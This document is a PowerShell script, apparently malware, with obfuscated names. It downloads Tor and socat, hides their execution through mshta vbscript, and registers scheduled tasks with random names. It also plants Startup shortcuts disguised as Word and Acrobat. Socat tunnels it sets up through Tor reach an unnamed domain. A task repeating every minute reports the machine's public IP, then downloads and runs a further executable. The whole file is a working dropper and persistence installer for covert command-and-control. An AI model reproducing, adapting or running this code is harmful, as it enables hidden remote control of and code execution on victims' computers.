$SH_TYPE_SCHEDULED_TASK=1;
$SH_TYPE_TASK_SCHEDULER=2;
$schedulerType=$SH_TYPE_SCHEDULED_TASK;
function vJYtFTKLash
{
param([string]$zipfile, [string]$destination);
$7z = Join-Path $env:ALLUSERSPROFILE '7za.exe';
if (-NOT (Test-Path $7z)){
Try
{
(New-Object System.Net.WebClient).DownloadFile('https://chocolatey.org/7za.exe',$7z);
}
Catch{}
}
if ($(Try { Test-Path $7z.trim() } Catch { $false })){
Start-Process "$7z" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
}
else{
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
}

function Add-Shortcut{
    param([string]$target_path, [string]$dest_path, [string]$work_path, [string]$arguments="");
    
    $_path=Split-Path $dest_path;
    if (-Not (Test-Path $_path)){
        mkdir -Force $_path;
    }
    if (-Not (Test-Path $target_path)){
        Write-Output "Can't add shortcut. Target path '$target_path' not found.";
        return;
    }
    if ((Test-Path $dest_path)){
        Write-Output "Can't add shortcut. Destination path '$dest_path' exist.";
        return;
    }

    $_shell = New-Object -ComObject ("WScript.Shell");
    $_shortcut = $_shell.CreateShortcut($dest_path);
    $_shortcut.TargetPath=$target_path;
    if(-Not [String]::IsNullOrEmpty($arguments)){
        $_shortcut.Arguments=$arguments;
    }
    $_shortcut.WorkingDirectory=$work_path;
    $_shortcut.Save();
}

function Base64ToFile
{
param([string]$file, [string]$string);
$bytes=[System.Convert]::FromBase64String($string);
#set-content -encoding byte $file -value $bytes;
[IO.File]::WriteAllBytes($file, $bytes);
}
function RandomString{
    param([int]$min=5, [int]$max=15);
    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
}
function InitScheduller{
    try{
        Import-Module ScheduledTasks -ErrorAction Stop;
        return $SH_TYPE_SCHEDULED_TASK;
    }catch{
        $File=$env:Temp+'\'+(RandomString)+'.zip';
        $Dest=$env:Temp+'\'+(RandomString);
        while (!(BHjbULqP 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
        vJYtFTKLash $File $Dest;
        Remove-Item -Force $File;
        $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
        return $SH_TYPE_TASK_SCHEDULER;
    }
}
function jLPnJWClmDVBa
{
param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
switch ($schedulerType) {
    $SH_TYPE_SCHEDULED_TASK {
        $Action = New-ScheduledTaskAction -Execute $cmd;
        if(-Not [String]::IsNullOrEmpty($params)){
            $Action.Arguments=$params;
        }
        if(-Not [String]::IsNullOrEmpty($dir)){
            $Action.WorkingDirectory=$dir;
        }
        $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
        try{
            $LogonTrigger.UserId=$env:username;
        }catch{
            $LogonTrigger.User=$env:username;
        }
        if(-Not $delay -eq 0){
            $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
        }
        if($restart -eq 1){
            $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));
        }
        $Settings = New-ScheduledTaskSettingsSet;
        $Settings.DisallowStartIfOnBatteries = $False;
        $Settings.StopIfGoingOnBatteries = $False;
        if($restart -eq 1){
            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);
        }else{
            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);
        }
        Start-ScheduledTask -InputObject $Task;
    };
    Default {
        $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
        $td=$ts.NewTask();
        $td.RegistrationInfo.Description = (RandomString);
        $td.Settings.DisallowStartIfOnBatteries = $False;
        $td.Settings.StopIfGoingOnBatteries = $False;
        $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
        $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
        $LogonTrigger.StartBoundary=[System.DateTime]::Now;
        $LogonTrigger.UserId=$env:username;
        $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
        $td.Triggers.Add($LogonTrigger);
        if($restart -eq 1){
        $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
        $TimeTrigger.StartBoundary=[System.DateTime]::Now;
        $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);
        $TimeTrigger.Repetition.StopAtDurationEnd=$False;
        $td.Triggers.Add($TimeTrigger);
        }
        $tsf="Microsoft.Win32.TaskScheduler";
        $ExecAction=New-Object "$tsf.ExecAction"($cmd,$params,$dir);
        $td.Actions.Add($ExecAction);
        $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
        $task.Run();
    };
}
}
function BHjbULqP {
    param([string]$RdjuM, [string]$CJJjosNxuWCDI);
    $ErrorActionPreference = "Stop";
    Write-Host ("Download {0} to {1}" -f ($RdjuM, $CJJjosNxuWCDI));
    try{
        [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, ssl3";
    }catch{}
    try {
        Start-BitsTransfer -Source $RdjuM -Destination $CJJjosNxuWCDI;
    }
    catch {
        #Write-Error $_ -ErrorAction Continue;
        try {
            (New-Object System.Net.WebClient).DownloadFile($RdjuM,$CJJjosNxuWCDI);
        }
        catch {
            #Write-Error $_ -ErrorAction Continue;
            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$RdjuM`" `"$CJJjosNxuWCDI`"" -Wait -WindowStyle Hidden;
        }
    }finally{
        $ErrorActionPreference = "Continue";
    }
    if ( $(Try { Test-Path $CJJjosNxuWCDI.trim() } Catch { $false })){
        return $true;
    }
    return $false;
}
function lWa{
$schedulerType = InitScheduller;
$tf=$env:Temp+'\'+(RandomString)+'.zip';
$euUTiqa=$env:ALLUSERSPROFILE+'\'+(RandomString);
$MqXDdNgkS=@([string]::Concat('https://di','st.t','orproject.org/'), [string]::Concat("https://mirror.oldsql.cc/t","or/di","st/"), [string]::Concat("https://to","rmirror.tb-itf-t","or.de/di","st/"));
foreach ($VsFwiqVKEg in $MqXDdNgkS) {
    $oepirVn=$VsFwiqVKEg+"torbrowser/8.0.3/t"+"or-win32-0.3.4.8.zip";
    if((BHjbULqP $oepirVn $tf)){
        break;
    }
}
if ((Test-Path $euUTiqa) -eq 1){Remove-Item -Force -Recurse $euUTiqa;}mkdir $euUTiqa | Out-Null;
vJYtFTKLash $tf $euUTiqa;
Remove-Item -Force $tf;
$lfOrlkZH=$euUTiqa+"\T"+"or\";
$eugtrj="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"t"+"or.exe`",0,False))";
jLPnJWClmDVBa (RandomString) 'mshta.exe' $eugtrj 0 0 $lfOrlkZH;

Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\msword.lnk" $vzfkFcawDbIUSya $toawwyJljC

$Rso=$env:Temp+'\'+(RandomString)+'.zip';
$WjYWCfwb=(RandomString);
$ujYYmgNxNo=$euUTiqa+'\'+$WjYWCfwb+'\';
BHjbULqP 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $Rso;
if ( $(Try { Test-Path $Rso.trim() } Catch { $false })){
    vJYtFTKLash $Rso $euUTiqa;
    $ViLUNZPxnsnJae=$euUTiqa+'\socat-windows-1.7.2.1\';
    Rename-Item -path $ViLUNZPxnsnJae -newName $WjYWCfwb;
}else{
    BHjbULqP 'http://blog.gentilkiwi.com/downloads/socat-1.7.2.1.zip' $Rso;
    vJYtFTKLash $Rso $ujYYmgNxNo;
}
Remove-Item -Force $Rso;
$s1cmd='socat tcp4-LISTEN:38340,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
$s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
$XohDZxb="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
$sCIQx="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
jLPnJWClmDVBa (RandomString) 'mshta.exe' $XohDZxb 0 0 $ujYYmgNxNo;
jLPnJWClmDVBa (RandomString) 'mshta.exe' $sCIQx 0 0 $ujYYmgNxNo;

Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\acrobat.lnk" $ujYYmgNxNo $XohDZxb
Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\sync.lnk" $ujYYmgNxNo $sCIQx

$gyzGBxzqFLBKp="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
jLPnJWClmDVBa (RandomString) 'mshta.exe' $gyzGBxzqFLBKp 1;
}
lWa;
